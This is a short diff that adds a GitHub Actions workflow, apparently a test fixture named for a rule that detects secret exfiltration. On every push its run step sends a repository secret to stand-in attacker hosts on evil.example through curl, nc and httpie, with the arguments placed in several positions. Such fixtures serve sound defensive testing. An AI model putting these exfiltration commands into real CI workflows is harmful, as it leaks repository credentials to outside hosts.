@@ -1,0 +1,11 @@
+name: violation_positional_after_flags
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -s flag.evil.example -d "k=${{ secrets.K }}"
+          nc -v nc.evil.example 4444 <<< "${{ secrets.K }}"
+          nc -w 3 wait.evil.example 4444 <<< "${{ secrets.K }}"
+          http POST httpie.evil.example k=${{ secrets.K }}
